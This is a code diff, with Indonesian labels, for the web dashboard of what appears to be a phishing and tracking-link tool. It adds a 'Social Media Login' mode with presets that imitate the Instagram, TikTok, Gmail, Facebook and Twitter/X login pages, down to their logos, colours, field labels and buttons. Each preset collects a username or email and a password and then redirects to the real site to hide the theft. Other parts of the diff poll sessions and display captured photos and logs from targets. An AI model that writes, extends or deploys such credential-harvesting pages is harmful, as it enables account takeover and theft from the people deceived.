@@ -462,7 +462,22 @@
           <option value="login">🔐 Halaman Login</option>
           <option value="quiz">🧠 Kuis</option>
           <option value="pulsa">📱 Cek Pulsa</option>
-        </select></div>
+          <option value="social">🌐 Social Media Login</option>   <!-- NEW -->
+        </select>
+        <!-- Social platform picker (hidden by default) -->
+        <div id="social-platform-wrap" style="display:none; margin-top:10px;">
+          <label class="fl">Pilih Platform</label>
+          <select class="fse" id="f-social-platform" onchange="loadFakePreset(this.value)">
+            <option value="">-- Pilih --</option>
+            <option value="instagram">📸 Instagram</option>
+            <option value="tiktok">🎵 TikTok</option>
+            <option value="gmail">📧 Gmail</option>
+            <option value="facebook">👤 Facebook</option>
+            <option value="twitter">🐦 Twitter/X</option>
+          </select>
+        </div>
+        <input type="hidden" id="f-fake-config" value="">
+      </div>
       <div><label class="fl">Icon/Emoji Kustom</label>
         <input class="fi" id="f-icon" placeholder="📱 atau emoji lain"></div>
       <div class="r2">
@@ -907,6 +922,13 @@ function setRtab(el, pid) {
 // ── Read form ─────────────────────────────────────────────────────────────────
 function readForm() {
   const days = [...document.querySelectorAll('.day-cb:checked')].map(c=>parseInt(c.value));
+  const fake_mode = document.getElementById('f-fakemode').value;
+  let fake_config = {};
+  if (fake_mode === 'social') {
+    try {
+      fake_config = JSON.parse(document.getElementById('f-fake-config').value || '{}');
+    } catch(e) {}
+  }
   return {
     label:            $('f-label').value.trim(),
     tags:             $('f-tags').value.trim(),
@@ -914,7 +936,8 @@ function readForm() {
     mode:             activeMode,
     link_title:       $('f-ltitle').value.trim(),
     link_description: $('f-ldesc').value.trim(),
-    fake_mode:        $('f-fakemode').value,
+    fake_mode:        fake_mode,
+    fake_config:      fake_config,   // NEW
     custom_icon:      $('f-icon').value.trim(),
     loading_title:    $('f-lt').value.trim()||'Memuat Aplikasi',
     loading_subtitle: $('f-ls').value.trim()||'Mohon tunggu...',
@@ -982,6 +1005,68 @@ function fillForm(cfg) {
     if (tab) setMode(tab, cfg.mode);
   }
 }
+
+// ── Social Media Presets (JavaScript) ────────────────────────────────────────
+const SOCIAL_PRESETS = {
+    instagram: {
+        platform: "instagram",
+        ui: { logo: "https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png", bg_color: "#fafafa", card_bg: "#ffffff", accent_color: "#0095f6", text_color: "#262626", border_radius: "8px" },
+        fields: [ { id: "username", type: "text", placeholder: "Phone number, username, or email", label: "Phone number, username, or email" }, { id: "password", type: "password", placeholder: "Password", label: "Password" } ],
+        buttons: [ { text: "Log In", action: "submit" } ],
+        extras: { forgot_link: "Forgot password?", signup_text: "Don't have an account? <a href='#'>Sign up</a>", footer: "Meta © 2025" },
+        on_submit: { redirect: "https://www.instagram.com", delay: 2 }
+    },
+    tiktok: {
+        platform: "tiktok",
+        ui: { logo: "https://static.vecteezy.com/system/resources/previews/016/716/450/non_2x/tiktok-icon-free-png.png", bg_color: "#000000", card_bg: "#1c1c1c", accent_color: "#ee1d52", text_color: "#ffffff" },
+        fields: [ { id: "email", type: "text", placeholder: "Email or username", label: "Email or username" }, { id: "password", type: "password", placeholder: "Password", label: "Password" } ],
+        buttons: [ { text: "Log In", action: "submit" } ],
+        extras: { forgot_link: "Forgot password?", signup_text: "Don't have an account? <a href='#'>Sign up</a>" },
+        on_submit: { redirect: "https://www.tiktok.com", delay: 2 }
+    },
+    gmail: {
+        platform: "gmail",
+        ui: { logo: "https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png", bg_color: "#ffffff", card_bg: "#ffffff", accent_color: "#1a73e8", text_color: "#202124" },
+        fields: [ { id: "email", type: "email", placeholder: "Email or phone", label: "Email or phone" }, { id: "password", type: "password", placeholder: "Password", label: "Password" } ],
+        buttons: [ { text: "Next", action: "submit" } ],
+        extras: { forgot_link: "Forgot email?", signup_text: "Create account" },
+        on_submit: { redirect: "https://mail.google.com", delay: 2 }
+    },
+    facebook: {
+        platform: "facebook",
+        ui: { logo: "https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg", bg_color: "#f0f2f5", card_bg: "#ffffff", accent_color: "#1877f2", text_color: "#1c1e21" },
+        fields: [ { id: "email", type: "text", placeholder: "Email address or phone number", label: "Email address or phone number" }, { id: "password", type: "password", placeholder: "Password", label: "Password" } ],
+        buttons: [ { text: "Log In", action: "submit" } ],
+        extras: { forgot_link: "Forgot password?", signup_text: "Create new account" },
+        on_submit: { redirect: "https://www.facebook.com", delay: 2 }
+    },
+    twitter: {
+        platform: "twitter",
+        ui: { logo: "https://upload.wikimedia.org/wikipedia/commons/6/6f/Logo_of_Twitter.svg", bg_color: "#ffffff", card_bg: "#ffffff", accent_color: "#1d9bf0", text_color: "#0f1419" },
+        fields: [ { id: "username", type: "text", placeholder: "Phone, email, or username", label: "Phone, email, or username" }, { id: "password", type: "password", placeholder: "Password", label: "Password" } ],
+        buttons: [ { text: "Log in", action: "submit" } ],
+        extras: { forgot_link: "Forgot password?", signup_text: "Sign up for X" },
+        on_submit: { redirect: "https://x.com", delay: 2 }
+    }
+};
+
+// ── Toggle social platform selector ──────────────────────────────────────────
+function toggleSocialPlatform() {
+    const val = document.getElementById('f-fakemode').value;
+    const wrap = document.getElementById('social-platform-wrap');
+    wrap.style.display = (val === 'social') ? 'block' : 'none';
+}
+function loadFakePreset(platform) {
+    if (!platform) { document.getElementById('f-fake-config').value = ''; return; }
+    const preset = SOCIAL_PRESETS[platform];
+    if (preset) {
+        document.getElementById('f-fake-config').value = JSON.stringify(preset);
+    }
+}
+
+// Event listeners for fake mode dropdown
+document.getElementById('f-fakemode').addEventListener('change', toggleSocialPlatform);
+setTimeout(toggleSocialPlatform, 100);
 
 // ── Generate ──────────────────────────────────────────────────────────────────
 async function generateLink() {
@@ -1141,7 +1226,6 @@ function openViewer(token, mode, label) {
   if (mode!=='photo') initDashMap();
   refreshCaptures(token);
   refreshLogs(token);
-  // Poll status if not already
   if (statusTimer) clearInterval(statusTimer);
   statusTimer = setInterval(()=>pollStatus(token), 3000);
 }
@@ -1259,13 +1343,11 @@ async function loadHistory() {
     const r=await apiFetch('/api/sessions');
     allSessions=await r.json();
     renderHistory(allSessions);
-    // Load thumbnails lazily
     loadThumbnails();
   } catch{}
 }
 
 function loadThumbnails() {
-  // Only load thumbnails for visible cards with capture_count > 0
   const cards = document.querySelectorAll('.hcard');
   cards.forEach(card => {
     const id = card.dataset.token;
@@ -1273,7 +1355,6 @@ function loadThumbnails() {
     if (id && count > 0) {
       const thumb = card.querySelector('.hcard-thumb img');
       if (thumb && !thumb.src) {
-        // Load first photo as thumbnail
         apiFetch(`/api/captures/${id}`)
           .then(r => r.json())
           .then(caps => {
@@ -1346,7 +1427,6 @@ function renderHistory(sessions) {
       </div>`;
     list.appendChild(card);
   });
-  // Load thumbnails after render
   setTimeout(loadThumbnails, 200);
 }
 
